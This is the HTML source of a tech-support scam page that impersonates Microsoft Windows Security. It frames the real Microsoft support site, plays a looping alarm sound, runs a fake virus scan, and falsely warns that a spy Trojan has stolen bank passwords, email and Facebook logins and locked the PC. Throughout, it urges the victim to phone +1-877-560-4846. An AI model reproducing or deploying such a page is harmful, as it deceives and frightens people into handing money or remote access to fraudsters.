...
<title>Microsoft Final Warning </title>


<link rel="icon" type="image/png" href="https://integrityiqtest.com/winpic/microsoft.png">
...
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-JNCVPNG0V6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-JNCVPNG0V6');
</script>
...
.title3 {font-size: 18px;font-weight: 700;text-transform: capitalize;position: relative;width: 27%;top: 23px;left: 13px;}
...
<body id="mycanvas" onclick="playSound()" >
  ...
  <iframe src="https://support.microsoft.com" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
  </iframe>
...
<div class="top">
<p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Microsoft Windows Security<img src="https://integrityiqtest.com/winpic/minimize.jpeg" class="" style="float: right; width:115px;"></p>
</div>

<h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">Security at a glance</h4>
<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what happens to the safety and health of the device and take all necessary measures.</p>
<div class="centerright">
<ul>
<li>
<br>
<img src="https://integrityiqtest.com/winpic/kxFy-clip.png" width="50px;">
...
<li>
<br><br>
<img src="https://integrityiqtest.com/winpic/qsbs-firewall.png" width="60px;">
...
<li>
<br>
<img src="https://integrityiqtest.com/winpic/s-S4-acc.png" width="60px;">
<p>Account protection</p>
<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action is required.</p>
</li>
<li>
<br>
<img src="https://integrityiqtest.com/winpic/Z5BR-network.png" width="51px;"/>
<p>Application and Browser Control</p>
<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action is required.</p>
</li>
</ul>
</div>
<img src="https://integrityiqtest.com/winpic/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
<br>
</div>
...
<div class="scan" id="scan">
  <div class="top">
  <p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows Security<img src="https://integrityiqtest.com/winpic/minimize.jpeg" class="" style="float: right; width:115px;"></p>
  </div>
  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="https://integrityiqtest.com/winpic/okPE-vs.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Protection against viruses and threats</h4>
...
top: 6px;
font-weight: 500;
font-size: 19px;" id="text12"><b>+1-877-560-4846 (Free Security)</b></h3>
  ...
  <div class="flex"> <img src="https://integrityiqtest.com/winpic/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current threats</p></div>
  ...
  <p style="font-size: 13px;" id="info">A quick analysis is underway...<br>Estimated remaining time: <n id="time">0</b></n><br><n id="amount">0</b></n> Scanned files.</p>

  <a href="#"class="button" id="re">I'm going to cancel it.</a>
  <p style=" font-size: 13px;" id="recx">Continue working while you analyze <br>the device.</p>

  <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">History of protection</p>
  <br>
...
<div class="flex"><img src="https://integrityiqtest.com/winpic/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: -34px;"><p style="position: absolute; left: 35px;    bottom: 113px;    line-height: 18px;">Configuring Virus and Threat Prevention <br></p> </div>
...
<p style="font-size: 13px; color: #0063c6;">Manage settings</p>
  ...
  <p style="position: absolute; top: -55px;">Do you have a question?</p>

  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">Getting help</p>
  ...
  <li>
    ...
    <li>
      ...
      <p style="position: absolute; top: 75px; "><br>Windows Help us improve the security of your system</p>

      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Please send us your comments</p>

      </li>
      <li>

        <p style="position: absolute; top: 190px;">Change your privacy settings</p>
        <p style="position: absolute; top: 220px; font-size: 13px;">View and edit Windows privacy settings<br><n id="which"></b></n> Terminal.</p>

        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 290px; cursor: pointer;">Privacy settings <br>Privacy dashboard <br>Privacy Statement</p>
...
margin-top: 8px; text-align: center;">Windows Security Spyware Warning</p>
                <p class="text-center">** Access to this PC is blocked for security reasons **</p>
                <p> Warns you that your computer is infected with a spy Trojan. The following data has been compromised: <br> <br>
                  > Email ID <br> > Bank password<br>
                  > Facebook Login<br>
                  > Photos and photographic documents </p>

                  <!-- <p>The Windows Security scan detected unwanted and potentially unwanted adware on this device that could steal passwords, online credentials, financial information, personal files, images or documents. <br / ><br / ></p> -->
                  <p> Please contact us immediately so that our engineer can explain the removal process to you by phone.<br><br>to learn more
               ...
               <p style="padding-bottom: 0px;">Windows Phone Support <strong>+1-877-560-4846 (Security Toll-Free)</strong></p>
...
<audio id="beep" loop>
  <source src="https://integrityiqtest.com/winpic/_Fm7-alert.mp3" type="audio/mpeg">
</audio>
...
<div id="lst" class="lst lightbox">
  <div class="ilb top">
      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://integrityiqtest.com/winpic/def.png" class="logo3"></span> Windows Security Defender Center</span>
          <span id="txts1" class="fl title2"><a href="#"><img src="https://integrityiqtest.com/winpic/cross.png"></a></span>
  ...
  <img id="banner" src="https://integrityiqtest.com/winpic/virus-images.jpeg">
  <div id="disclaimer">
    Access to this PC is blocked for security reasons.<br>
      <span class="support">Contact Windows Support:+1-877-560-4846 (Toll-Free)</span>
  </div>
  <div id="bottom">
      <img id="badge" src="https://integrityiqtest.com/winpic/microsoft.png"><span class="title3">Microsoft</span>
      <ul>
          <li>
              <a href="#">
  ...
  <div class="row">
      ...
      <div class="col-md-12">
          <div class="right-foot" style="text-align: center;">
              <span id="footertxt"><img src="https://integrityiqtest.com/winpic/microsoft.png"> Microsoft: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">Support Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-877-560-4846 (Toll-Free)</span></span>
          </div>
      </div>
      <div class="col-md-12">
          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 12px;">Windows
            Defender SmartScreen prevented unrecognized applications from being displayed. When you run this application, your PC can be placed
            He's in danger. The analysis of Windows Defender has discovered an unwanted adware that can fly on this device
            Password, online login, financial information, personal files, photos or
            Document.</small></marquee>
      </div>
  </div>
...
<div id="welcomeDiv"
    ...
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not restart or use
      Your computer.<br>The computer is disabled. Please, call me.<br> Access is a blocking security reason for this
      Computer.<br> Please contact us immediately. Our technicians will help you solve the problem.</p>
...
<div class="modal fade" id="exitModal" tabindex="-1" role="dialog">
  <div class="modal-dialog modal-full-height modal-right" role="document">
    <div class="modal-content">
      <img id="modal-exit" src="https://integrityiqtest.com/winpic/cross.png" class="modal-exit">
        ...
        <div class="row">
          <div class="d-none d-md-block col-md-5 text-center">
            <a href="#" target="_blank" class="exit-href" rel="noopener noreferrer nofollow">
              <img class="img-fluid rounded" src="https://integrityiqtest.com/winpic/stop.png" />
            </a>
          </div>
          <div class="col-12 col-md-7 text-left">
            <div id="modal-title" class="modal-title text-center modal-title-1">Microsoft Final Security Warning !!  <br/>
              Please do not close this page <br/> Call Now +1-877-560-4846 </div>
            <div class="">
...
<div id="chat-box">
  <img src="https://integrityiqtest.com/winpic/microsoft.png"><span style="color: #222;
font-size: 21px;
font-weight: 700;
margin-left: 9px;
position: relative;
top: 4px;">Microsoft</span> <p style="font-weight: 700;">Microsoft Support</p>
 <h4 style="font-weight: 700;">+1-877-560-4846 <br>(USA Head Office)</h4>
  ...
  $('#comment_form').submit(function(e)
  {
    ...
    $.ajax(
    {
      ...
      { 
        ...
        {
          var msg = [];
          for ( var z in data.error ) msg.push(data.error[z]);
          $('#comment_err').html( '<div class="border-blue">' + msg.join('<br />') + '</div>' );
          $('#comment_form').hide();
        }
        else if ( data.status == 2 )
        {
          ...
          $('#captcha').val('');
          $('#comment_err').html( '<div class="border-red">' + msg.join('<br />') + '</div>' );
        }
        else
        {
          $('#comment_err').html( 'Unkown error please contact admin' );
        }
      }
    });
  });
